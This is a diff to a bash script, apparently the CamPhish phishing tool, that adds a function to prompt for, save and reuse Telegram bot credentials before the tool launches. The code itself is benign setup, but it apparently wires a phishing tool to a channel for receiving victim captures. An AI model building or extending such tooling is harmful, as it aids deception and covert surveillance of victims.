@@ -526,6 +526,31 @@ fi
 fi
 }
 
+
+configure_telegram() {
+    printf "\n"
+    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram Configuration\e[0m\n"
+    
+    if [[ -f "telegram_bot_token.txt" ]] && [[ -f "telegram_chat_id.txt" ]]; then
+        read -p $'\e[1;92m[\e[0m?\e[1;92m] Telegram credentials found. Use saved credentials? [Y/n]:\e[0m ' use_saved
+        use_saved="${use_saved:-Y}"
+        if [[ $use_saved == "n" || $use_saved == "N" ]]; then
+            rm telegram_bot_token.txt telegram_chat_id.txt
+        else
+            return
+        fi
+    fi
+
+    read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter Telegram Bot Token: \e[0m' bot_token
+    read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter Telegram Chat ID: \e[0m' chat_id
+
+    echo "$bot_token" > telegram_bot_token.txt
+    echo "$chat_id" > telegram_chat_id.txt
+    printf "\e[1;92m[\e[0m+\e[1;92m] Credentials saved!\e[0m\n"
+}
+
 banner
 dependencies
+configure_telegram
 camphish
+
